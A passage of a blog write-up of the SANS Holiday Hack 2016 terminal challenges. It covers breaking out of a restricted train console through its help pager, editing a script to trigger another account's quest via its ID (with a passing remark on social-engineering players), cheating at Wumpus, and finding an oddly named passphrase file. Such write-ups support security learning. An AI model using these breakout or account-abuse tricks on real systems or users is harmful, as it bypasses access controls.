BrakesBRAKEOFF:                       Release BrakesSTART:                          Start TrainHELP:                           Open the help documentQUIT:                           Exit consolemenu:main&gt; HELPsh-4.3$ Now I have a shell.  A quick ls -la will show the other files in the current directory. sh-4.3$ ls -latotal 40drwxr-xr-x 2 conductor conductor  4096 Dec 10 19:39 .drwxr-xr-x 6 root      root       4096 Dec 10 19:39 ..-rw-r--r-- 1 conductor conductor   220 Nov 12  2014 .bash_logout-rw-r--r-- 1 conductor conductor  3515 Nov 12  2014 .bashrc-rw-r--r-- 1 conductor conductor   675 Nov 12  2014 .profile-rwxr-xr-x 1 root      root      10528 Dec 10 19:36 ActivateTrain-rw-r--r-- 1 root      root       1506 Dec 10 19:36 TrainHelper.txt-rwxr-xr-x 1 root      root       1588 Dec 10 19:36 Train_Consolesh-4.3$ To activate the train, all I need to do is run ./ActivateTrain and I will be transported back to 1978. Santa is hiding out in this area too.  Back to the future!  One last thing, if you view the Train_Console script, you can see how the game sends a user back in time. To test if I could send another user back in time, I quickly created a second account, collected the Cranberry Pi parts required and logged into this terminal on a different browser.  Here is the output of the original Train_Console script. sh-4.3$ cat Train_Console#!/bin/bashHOMEDIR=\"/home/conductor\"CTRL=\"$HOMEDIR/\"DOC=\"$HOMEDIR/TrainHelper.txt\"PAGER=\"less\"BRAKE=\"on\"PASS=\"24fb3e89ce2aa0ea422c3d511d40dd84\"print_header() {        echo \"\"        echo \"Train Management Console: AUTHORIZED USERS ONLY\"        echo \"\"}print_main_menu() {        echo \"\"        echo \"                  ==== MAIN MENU ====\"        echo \"\"        echo \"STATUS:                   Train Status\"        echo \"BRAKEON:                  Set Brakes\"        echo \"BRAKEOFF:                 Release Brakes\"        echo \"START:                    Start Train\"        echo \"HELP:                     Open the help document\"        echo \"QUIT:                     Exit console\"        echo \"\"        echo -n \"menu:main&gt; \"}# MAINtrap \"exit\" SIGHUP SIGINT SIGTERM SIGQUITprint_headerwhile(true); do        print_main_menu        read ARG        echo \"\"        if [[ ! $ARG ]] ; then                echo \"Please select an number\"                continue        fi        case \"$ARG\" in                STATUS)                        echo \"Brake:                            $BRAKE\"                        echo \"BoilerOn:                         Yes\"                        echo \"BoilerTemp:                       Normal\"                        echo \"Coal Capacity Level:              97%\"                        echo \"FluxCapacitor:                    Fluxing\"                        echo \"Top Speed:                        88mph\"                        ;;                BRAKEON)                        sleep 1                        BRAKE=\"on\"        echo \"QUIT:                             Exit console\"                        echo \"The brake has been applied.\"                        echo $BRAKE                        ;;                BRAKEOFF)                        sleep 1                        BRAKE=\"off\"                        echo \"*******CAUTION*******\"                        echo \"The brake has been released!\"                        echo \"*******CAUTION*******\"                        echo $BRAKE                        ;;                START)                        echo  \"Checking brakes....\"                        sleep 3                        if [ $BRAKE == \"on\" ] ; then                                echo \"Brake must be off to start the train.\"                        else                                read -s -p \"Enter Password: \" password                                [ \"$password\" == \"$PASS\" ] &amp;&amp; QUEST_UID=$QUEST_UID ./ActivateTrain || echo \"Access denied\"                        fi                        continue                        ;;                HELP) $PAGER $DOC                        ;;                QUIT) echo \"Exiting\" ; exit                        ;;        esacdoneRunning the env command will print out the environmental variables which includes your unique QUEST_UID value. My Primary Account: sh-4.3$ envHOSTNAME=2a3d1803b361TERM=xtermQUEST_UID=4152024d099e6dfa4649f7016a860dxxxxxxxxx  # redactedPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin_=/usr/bin/envPWD=/home/conductorHOME=/home/conductorSHLVL=12My Test Account: sh-4.3$ envHOSTNAME=64fd641742ecTERM=xtermQUEST_UID=35ca097769d78a92364e3caff3cb75xxxxxxxxxx  # redactedPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin_=/usr/bin/envPWD=/home/conductorSHLVL=3HOME=/home/conductorIn my primary account, I made a copy of the Train_Console script and called it TC1.  I modified the PASS=\"24fb3e89ce2aa0ea422c3d511d40dd84\" value to be simply 123 to save from typing that long original password, set the BREAK=\"Off\" and finally changed the QUEST_UID=$QUEST_UID to be the hardcoded QUEST_UID=35ca097769d78a92364e3caff3cb75xxxxxxxxx of my test account. Executed the script ./TC1 then typed START and pressed enter.  My test account was sent back in time!  Fortunately there is enough entropy in the QUEST_UID value that I don’t see people sending random users back to 1978.  If you could social engineer someone in to giving you their QUEST_UID value, you could send them back in time. Although I’m sure this goes against the terms of service and I do not recommend anyone doing this! Wumpus Challenge  Challenge Objective:  Kill the Wumpus ********************************************************************************                                                                             ** Find the passphrase from the wumpus.  Play fair or \"cheat\"; it's up to you. * *                                                                             ********************************************************************************I started the game and successfully killed the Wumpus on the first try. ./wumpusInstructions? (y-n) nYou're in a cave with 20 rooms and 3 tunnels leading from each room.There are 3 bats and 3 pits scattered throughout the cave, and yourquiver holds 5 custom super anti-evil Wumpus arrows.  Good luck.You are in room 2 of the cave, and have 5 arrows left.*sniff* (I can smell the evil Wumpus nearby!)There are tunnels to rooms 5, 7, and 19.Move or shoot? (m-s) s19*thwock!* *groan* *crash*A horrible roar fills the cave, and you realize, with a smile, that youhave slain the evil Wumpus and won the game!  You don't want to tarry forlong, however, because not only is the Wumpus famous, but the stench ofdead Wumpus is also quite well known, a stench plenty enough to slay themightiest adventurer at a single whiff!!Passphrase:WUMPUS IS MISUNDERSTOODPassphrase: WUMPUS IS MISUNDERSTOOD This is great! I completed the challenge and obtained the passphase.  However, the challenge banner stated that it was possible to cheat and I wanted to know how to do so.  I ran strings on the wumpus file but when nothing jumped out at me, I turned to the Internet and found what seems the be the original source code for the game “wump.”  I wasn’t sure how much the source code had been modified in our version but at least it gave me an idea of what the game’s logic could be. I also noticed that lines 791-795 seem to be command line arguments but I wasn’t sure what they did yet. { (void)fprintf(stderr, \"usage: wump [-h] [-a arrows] [-b bats] [-p pits] [-r rooms] [-t tunnels]\\n\"); exit(1);}Digging a little deeper I found an explanation for those options in an archived wumpus man page thanks to .  Let’s create a cave with only 6 rooms (-r 6) for the Wumpus to hide and 100 arrows (-a 100) instead of the default 20 rooms and 5 arrows. I like my odds… ./wumpus -r 6 -a 100Instructions? (y-n) nYou're in a cave with 6 rooms and 3 tunnels leading from each room.There are 3 bats and 3 pits scattered throughout the cave, and yourquiver holds 100 custom super anti-evil Wumpus arrows.  Good luck.You are in room 6 of the cave, and have 100 arrows left.*rustle* *rustle* (must be bats nearby)*whoosh* (I feel a draft from some pits).*sniff* (I can smell the evil Wumpus nearby!)There are tunnels to rooms 1, 4, and 5.Move or shoot? (m-s) s1*whoosh* (I feel a draft from some pits).*sniff* (I can smell the evil Wumpus nearby!)There are tunnels to rooms 1, 4, and 5.Move or shoot? (m-s) s2*thunk*  The arrow can't find a way from 6 to 2 and flys randomlyinto room 4!You are in room 6 of the cave, and have 98 arrows left.*rustle* *rustle* (must be bats nearby)*whoosh* (I feel a draft from some pits).*sniff* (I can smell the evil Wumpus nearby!)There are tunnels to rooms 1, 4, and 5.Move or shoot? (m-s) s3*thunk*  The arrow can't find a way from 6 to 3 and flys randomlyinto room 5!*thwock!* *groan* *crash*A horrible roar fills the cave, and you realize, with a smile, that youhave slain the evil Wumpus and won the game!  You don't want to tarry forlong, however, because not only is the Wumpus famous, but the stench ofdead Wumpus is also quite well known, a stench plenty enough to slay themightiest adventurer at a single whiff!!Passphrase:WUMPUS IS MISUNDERSTOODCare to play another game? (y-n) Now that’s what I’m talking about.  Doormat Challenge  Challenge Objective:  Find the Hidden Passphrase ********************************************************************************                                                                             ** To open the door, find the passphrase file deep in the directories.         * *                                                                             ********************************************************************************Passwords (passphrases) are typically found in text files, so I’ll see if I can find any .txt files first. $ find / -name *.txt/home/elf/.doormat/. / /\\/\\\\/Don't Look Here!/You are persistent, aren't you?/'/key_for_the_door.txtNow that the location for the key is known, I just have to get to it.  It’s not as straightforward as simply changing to that directory and viewing the file. Certain characters need to be escaped.  Escaping is a method of quoting single characters. The escape (\\) preceding a character tells the shell to interpret that character literally. Here is a one liner with each character being escaped.  Running this command will print out the passphrase: cat \"/home/elf/.doormat/. / /\\/\\\\\\\\/\"\"Don't Look Here\"'!'\"\"/\"You are persistent, aren't you?\"/\"'\"/\"key_for_the_door.txt\" Which prints out:  key: open_sesame Or you can achieve the same thing manually browsing directory by directory… cd /home/elf/ls -la  # to see all directories including hidden ones cd .doormatls -la  # to see all directories including hidden ones cd \". /\"ls -la  # to see all directories including hidden ones cd \" \"ls -la  # to see all directories including hidden ones cd \"\\\\\"ls -la  # to see all directories including hidden ones cd \\\\\\\\ls -la  # to see all directories including hidden ones cd \"Don't Look Here!\"ls -la  # to see all directories including hidden ones cd \"You are persistent, aren't you?\"ls -la  # to see all directories including hidden ones cd \"'\"ls -la  # to see all directories including hidden ones cat key_for_the_door.txtkey: open_sesame War Games Challenge  Challenge Objective:  Start a Global Thermonuclear War To win this challenge, you need to enter the dialog from the 1983 movie WarGames. It has to be EXACT.  Now you can watch the movie clips on YouTube and type it manually or use the wargames.sh script found on GitHub.  That script will almost get you past this challenge with one exception, line 216 says “Later. Lets play Global Thermonuclear War.” It should be “Later. Let’s play Global Thermonuclear War.” The text in ALL CAPTIALS is from the terminal.  The text in lowercase is what I entered. GREETINGS PROFESSOR FALKEN.Hello.HOW ARE YOU FEELING TODAY?I'm fine. How are you?EXCELLENT.  IT'S BEEN A LONG TIME.  CAN YOU EXPLAINTHE REMOVAL OF YOUR USER ACCOUNT NUMBER ON 6/23/73?People sometimes make mistakes.YES THEY DO.  SHALL WE PLAY A GAME?Love to. How about Global Thermonuclear War?WOULDN'T YOU PREFER A GOOD GAME OF CHESS?Later. Let's play Global Thermonuclear War.FINE     WHICH SIDE DO YOU WANT?  1.   UNITED STATES  2.   SOVIET UNION      PLEASE CHOOSE ONE:2PLEASE LIST PRIMARY TARGETS BYCITY AND/OR COUNTY NAME:Las VegasLAUNCH INITIATED, HERE'S THE KEY FOR YOUR TROUBLE: LOOK AT THE PRETTY LIGHTSPress Enter To Continue`LOOK AT THE PRETTY LIGHTS` is the passphase to enter The Corridor hidden behind Santa's bookshelf.Passphase is LOOK AT THE PRETTY LIGHTS  ","categories": ["SANS","Holday Hack","writeup"],
        "tags": [],
        "url": "https://www.joshtomkiel.com/sans/holday%20hack/writeup/sans-holiday-hack-terminals-2016/",
        "teaser":"https://www.joshtomkiel.com/assets/images/sans-2016.png"},]
